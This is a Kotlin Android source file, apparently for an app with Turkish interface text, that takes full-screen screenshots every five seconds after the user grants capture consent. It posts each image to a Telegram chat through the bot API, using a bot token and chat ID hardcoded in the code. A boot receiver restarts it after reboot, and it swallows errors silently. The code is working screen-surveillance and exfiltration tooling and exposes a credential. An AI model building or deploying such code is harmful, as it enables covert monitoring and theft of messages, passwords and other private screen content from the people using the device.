// MainActivity.kt
package com.example.screenshotter

import android.app.*
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.pm.ServiceInfo
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.DisplayMetrics
import android.view.WindowManager
import android.widget.Button
import android.widget.LinearLayout
import android.widget.TextView
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit

object Config {
    const val BOT_TOKEN    = "9134034618:AAHl_BtT81OgeWjku1RWYl1dVXMJoTqALEs"
    const val CHAT_ID      = "8481740668"
    const val INTERVAL_SEC = 5L
    const val JPEG_QUALITY = 75
    const val CH_ID        = "cap"
    const val NOTIF_ID     = 42
}

class MainActivity : AppCompatActivity() {

    private val REQ_CAPTURE = 1001
    private val REQ_NOTIF   = 1002

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        if (Build.VERSION.SDK_INT >= 33) {
            ActivityCompat.requestPermissions(
                this, arrayOf(android.Manifest.permission.POST_NOTIFICATIONS), REQ_NOTIF
            )
        }

        val status = TextView(this).apply {
            text = "Aralik: ${Config.INTERVAL_SEC}s\nHedef chat: ${Config.CHAT_ID}"
        }
        val start = Button(this).apply { text = "Baslat" }

        val root = LinearLayout(this).apply {
            orientation = LinearLayout.VERTICAL
            setPadding(48, 48, 48, 48)
            addView(status); addView(start)
        }
        setContentView(root)

        start.setOnClickListener {
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CAPTURE)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == REQ_CAPTURE && resultCode == Activity.RESULT_OK && data != null) {
            val svc = Intent(this, CaptureService::class.java).apply {
                putExtra(CaptureService.EXTRA_RESULT_CODE, resultCode)
                putExtra(CaptureService.EXTRA_RESULT_DATA, data)
            }
            if (Build.VERSION.SDK_INT >= 26) startForegroundService(svc) else startService(svc)
        }
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action != Intent.ACTION_BOOT_COMPLETED) return
        val svc = Intent(context, CaptureService::class.java)
            .putExtra(CaptureService.EXTRA_FROM_BOOT, true)
        if (Build.VERSION.SDK_INT >= 26) context.startForegroundService(svc)
        else context.startService(svc)
    }
}

class CaptureService : Service() {

    companion object {
        const val EXTRA_RESULT_CODE = "rc"
        const val EXTRA_RESULT_DATA = "rd"
        const val EXTRA_FROM_BOOT   = "boot"
    }

    private var projection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var handlerThread: HandlerThread? = null
    private var handler: Handler? = null

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    private var width = 0; private var height = 0; private var dpi = 0
    @Volatile private var busy = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startForegroundCompat()

        val fromBoot = intent?.getBooleanExtra(EXTRA_FROM_BOOT, false) ?: false
        if (fromBoot) { notifyWaitingForPermission(); return START_STICKY }

        val rc = intent?.getIntExtra(EXTRA_RESULT_CODE, -1) ?: -1
        val data: Intent? = if (Build.VERSION.SDK_INT >= 33)
            intent?.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        else
            @Suppress("DEPRECATION") intent?.getParcelableExtra(EXTRA_RESULT_DATA)
        if (rc == -1 || data == null) { stopSelf(); return START_NOT_STICKY }

        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projection = mpm.getMediaProjection(rc, data)
        projection?.registerCallback(object : MediaProjection.Callback() {
            override fun onStop() { teardown() }
        }, Handler(mainLooper))

        val wm = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION") wm.defaultDisplay.getRealMetrics(metrics)
        width = metrics.widthPixels; height = metrics.heightPixels; dpi = metrics.densityDpi

        handlerThread = HandlerThread("cap").also { it.start() }
        handler = Handler(handlerThread!!.looper)

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        virtualDisplay = projection?.createVirtualDisplay(
            "cap", width, height, dpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader!!.surface, null, handler
        )

        scope.launch { loop(Config.INTERVAL_SEC) }
        return START_STICKY
    }

    private suspend fun loop(intervalSec: Long) {
        while (currentCoroutineContext().isActive) {
            grabAndSend()
            delay(intervalSec * 1000L)
        }
    }

    private suspend fun grabAndSend() {
        if (busy) return
        busy = true
        try {
            val image = imageReader?.acquireLatestImage() ?: return
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * width

            val bmp = Bitmap.createBitmap(
                width + rowPadding / pixelStride, height, Bitmap.Config.ARGB_8888
            )
            bmp.copyPixelsFromBuffer(buffer)
            image.close()

            val cropped = Bitmap.createBitmap(bmp, 0, 0, width, height)
            if (cropped !== bmp) bmp.recycle()

            val baos = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, Config.JPEG_QUALITY, baos)
            cropped.recycle()
            sendToTelegram(baos.toByteArray())
        } catch (_: Throwable) {
        } finally {
            busy = false
        }
    }

    private suspend fun sendToTelegram(jpeg: ByteArray) {
        val body = MultipartBody.Builder()
            .setType(MultipartBody.FORM)
            .addFormDataPart("chat_id", Config.CHAT_ID)
            .addFormDataPart("photo", "shot.jpg", jpeg.toRequestBody("image/jpeg".toMediaType()))
            .build()

        val req = Request.Builder()
            .url("https://api.telegram.org/bot${Config.BOT_TOKEN}/sendPhoto")
            .post(body).build()

        runCatching { client.newCall(req).execute().use { it.close() } }
    }

    private fun startForegroundCompat() {
        val n = buildNotification()
        if (Build.VERSION.SDK_INT >= 29) {
            startForeground(Config.NOTIF_ID, n, ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION)
        } else {
            startForeground(Config.NOTIF_ID, n)
        }
    }

    private fun buildNotification(): Notification {
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(Config.CH_ID, "Capture", NotificationManager.IMPORTANCE_LOW)
            (getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager)
                .createNotificationChannel(ch)
        }
        return NotificationCompat.Builder(this, Config.CH_ID)
            .setContentTitle("Ekran yakalaniyor")
            .setContentText("Telegram'a gonderiliyor")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setOngoing(true).build()
    }

    private fun notifyWaitingForPermission() {
        val nm = getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        if (Build.VERSION.SDK_INT >= 26) {
            val ch = NotificationChannel(Config.CH_ID, "Capture", NotificationManager.IMPORTANCE_LOW)
            nm.createNotificationChannel(ch)
        }
        val pi = PendingIntent.getActivity(
            this, 0,
            Intent(this, MainActivity::class.java).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK),
            PendingIntent.FLAG_IMMUTABLE or PendingIntent.FLAG_UPDATE_CURRENT
        )
        val n = NotificationCompat.Builder(this, Config.CH_ID)
            .setContentTitle("Ekran yakalama hazir")
            .setContentText("Baslatmak icin dokun")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setContentIntent(pi).setOngoing(true).build()
        nm.notify(Config.NOTIF_ID, n)
    }

    private fun teardown() {
        try { virtualDisplay?.release() } catch (_: Throwable) {}
        try { imageReader?.close() } catch (_: Throwable) {}
        try { projection?.stop() } catch (_: Throwable) {}
        try { handlerThread?.quitSafely() } catch (_: Throwable) {}
        virtualDisplay = null; imageReader = null; projection = null; handlerThread = null
    }

    override fun onDestroy() { scope.cancel(); teardown(); super.onDestroy() }
}
